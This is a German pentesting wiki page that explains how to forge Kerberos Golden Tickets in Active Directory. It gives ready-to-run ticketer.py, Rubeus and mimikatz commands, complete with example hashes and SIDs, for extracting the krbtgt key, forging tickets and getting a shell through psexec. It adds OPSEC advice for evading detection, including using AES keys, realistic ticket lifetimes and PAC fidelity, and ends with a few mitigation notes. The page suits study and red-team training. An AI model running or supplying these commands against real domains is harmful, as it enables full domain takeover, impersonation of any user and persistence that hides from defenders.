# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden Ticket

Ein **Golden Ticket**-Angriff besteht in der **Erstellung eines legitimen Ticket Granting Ticket (TGT), das einen beliebigen Benutzer imitiert**, unter Verwendung des **NTLM-Hashs des Active Directory (AD)-Kontos krbtgt**. Diese Technik ist besonders vorteilhaft, da sie **den Zugriff auf jeden Dienst oder Computer** innerhalb der Domäne als der imitierte Benutzer ermöglicht. Es ist wichtig zu beachten, dass die **Anmeldedaten des Kontos krbtgt niemals automatisch aktualisiert werden**.<sup>[[1]](#references)</sup>

Um den **NTLM-Hash** des Kontos krbtgt zu **erlangen**, können verschiedene Methoden eingesetzt werden. Er kann aus dem **Local Security Authority Subsystem Service (LSASS)-Prozess** oder der **NT Directory Services (NTDS.dit)-Datei** extrahiert werden, die sich auf jedem Domain Controller (DC) innerhalb der Domäne befindet. Darüber hinaus ist die **Ausführung eines DCsync-Angriffs** eine weitere Strategie, um diesen NTLM-Hash zu erhalten. Dies kann mithilfe von Tools wie dem **lsadump::dcsync-Modul** in Mimikatz oder dem **secretsdump.py-Skript** von Impacket erfolgen. Es ist wichtig zu betonen, dass für die Durchführung dieser Vorgänge normalerweise **Domain-Admin-Berechtigungen oder ein vergleichbares Zugriffslevel erforderlich sind**.<sup>[[2]](#references)</sup>

Obwohl der NTLM-Hash für diesen Zweck verwendet werden kann, wird aus Gründen der operativen Sicherheit **dringend empfohlen**, Tickets mithilfe der **Advanced Encryption Standard (AES)-Kerberos-Schlüssel (AES128 und AES256)** zu **fälschen**. Dies ist in modernen Domänen noch wichtiger, da die **Verwendung von RC4 schrittweise eingestellt wird** und in der Kerberos-Telemetrie deutlich stärker auffällt.<sup>[[5]](#references)</sup>
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Moderne Hinweise zum Ticket Crafting

Wenn möglich, **frage zuerst LDAP und SYSVOL ab** und fälsche anschließend das Ticket mithilfe der echten Domain Policy und der PAC-Werte des Benutzers, anstatt sie manuell zu erfinden:<sup>[[4]](#references)</sup>
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` fragt den DC nach den Benutzer-, Gruppen-, NetBIOS- und Richtliniendaten, die zum Erstellen eines realistischeren PAC verwendet werden.
- `/printcmd` gibt eine Offline-Befehlszeile mit den abgerufenen PAC-Feldern aus. Das ist nützlich, wenn du später dasselbe Ticket fälschen möchtest, ohne erneut LDAP zu verwenden.
- `/extendedupndns` fügt die neueren `UpnDns`-PAC-Elemente hinzu, die den `samAccountName` und die Konto-SID enthalten.
- `/oldpac` entfernt die neueren `Requestor`- und `Attributes`-PAC-Puffer. Dies ist hauptsächlich für Kompatibilitätstests mit älteren Umgebungen nützlich und nicht für den standardmäßigen Einsatz.

Unter Linux unterstützen aktuelle Impacket-Versionen ebenfalls das Hinzufügen der neueren PAC-Strukturen und das Festlegen eines realistischen Gültigkeitszeitraums:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` wird in **Stunden** angegeben. Der Standardwert beträgt **10 Jahre**, was auffällig ist.
- `-extra-pac` fügt die neueren `UPN_DNS`-PAC-Informationen hinzu.
- `-old-pac` erzwingt das Legacy-PAC-Layout.
- `-extra-sid` ist nützlich, wenn der PAC zusätzliche SIDs benötigt (beispielsweise bei Szenarien zur Eskalation von Child zu Parent, die unter [SID-History Injection](sid-history-injection.md) behandelt werden).

**Sobald** du das **golden Ticket injiziert** hast, kannst du auf die freigegebenen Dateien **(C$)** zugreifen sowie Dienste und WMI ausführen. Du könntest also **psexec** oder **wmiexec** verwenden, um eine shell zu erhalten (es scheint, dass du über winrm keine shell erhalten kannst).

### Umgehen gängiger Erkennungen

Die häufigste Methode zur Erkennung eines golden Tickets besteht darin, den **Kerberos-Datenverkehr** im Netzwerk zu untersuchen. Standardmäßig **signiert** Mimikatz das TGT für **10 Jahre**, was bei nachfolgenden damit durchgeführten TGS-Anfragen als anormal auffällt.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Verwende die Parameter `/startoffset`, `/endin` und `/renewmax`, um den Startversatz, die Dauer und die maximale Anzahl der Erneuerungen zu steuern (alle Angaben in Minuten).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Leider wird die Lebensdauer des TGT nicht in den 4769-Ereignissen protokolliert, daher wirst du diese Information nicht in den Windows-Ereignisprotokollen finden. Was du jedoch korrelieren kannst, ist das **Auftreten von 4769-Ereignissen ohne vorheriges 4768-Ereignis**. Es ist **nicht möglich, einen TGS ohne einen TGT anzufordern**. Wenn es keinen Eintrag darüber gibt, dass ein TGT ausgestellt wurde, können wir daraus schließen, dass er offline gefälscht wurde.

In **neueren Windows-Builds** stellen die Ereignis-IDs **4768** und **4769** außerdem deutlich bessere Telemetriedaten zum **Verschlüsselungstyp** bereit. Ein gefälschter TGT/TGS mit **RC4 (`0x17`)** in einer Domäne, in der `krbtgt`, Clients und Dienste bereits AES-Schlüssel besitzen, ist wesentlich leichter zu erkennen als noch vor einigen Jahren. Dies ist ein weiterer Grund, **AES-basierte Golden Tickets** zu bevorzugen und die normale Kerberos-Richtlinie der Domäne so genau wie möglich nachzuahmen.

Ein weiteres OPSEC-Problem ist die **PAC-Treue**. Tickets mit unmöglichen Gruppenmitgliedschaften, fehlenden neueren PAC-Puffern oder Kontometadaten, die nicht mit LDAP übereinstimmen, lassen sich leichter erkennen, wenn Defender die PAC-Inhalte mit den AD-Daten validieren. Wenn du einen TGT benötigst, der so aussieht, als wäre er tatsächlich von einem DC ausgestellt worden, sieh dir Folgendes an:

{{#ref}}
diamond-ticket.md
{{#endref}}

Es gibt außerdem **umgebungsbedingte Grenzen** für die Persistenz. Das Konto `krbtgt` führt einen **Passwortverlauf von 2**, daher kann ein gefälschter TGT den **ersten** `krbtgt`-Reset überstehen, wenn er mit dem vorherigen Schlüssel signiert wurde. Deshalb machen Defender Golden Tickets ungültig, indem sie `krbtgt` **zweimal zurücksetzen** und zwischen den Resets mindestens die maximale Ticketlebensdauer der Domäne abwarten.<sup>[[3]](#references)</sup>

Um diese **Erkennung zu umgehen**, sieh dir die Diamond Tickets an.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Weitere kleine Tricks, die Defender einsetzen können, sind **Warnungen für 4769-Ereignisse bei sensiblen Benutzern**, beispielsweise beim standardmäßigen Domänenadministratorkonto, sowie Warnungen bei der **Verwendung von RC4 für `krbtgt`** in Domänen, die normalerweise AES-Tickets ausstellen.<sup>[[5]](#references)</sup>

## Referenzen

- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Kerberos: Golden Tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [3] [AD Forest Recovery - Reset the krbtgt password | Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [4] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [5] [Microsoft – How to manage Kerberos KDC usage of RC4 for service account ticket issuance (CVE-2026-20833)](https://support.microsoft.com/en-us/topic/how-to-manage-kerberos-kdc-usage-of-rc4-for-service-account-ticket-issuance-changes-related-to-cve-2026-20833-1ebcda33-720a-4da8-93c1-b0496e1910dc)

{{#include ../../banners/hacktricks-training.md}}
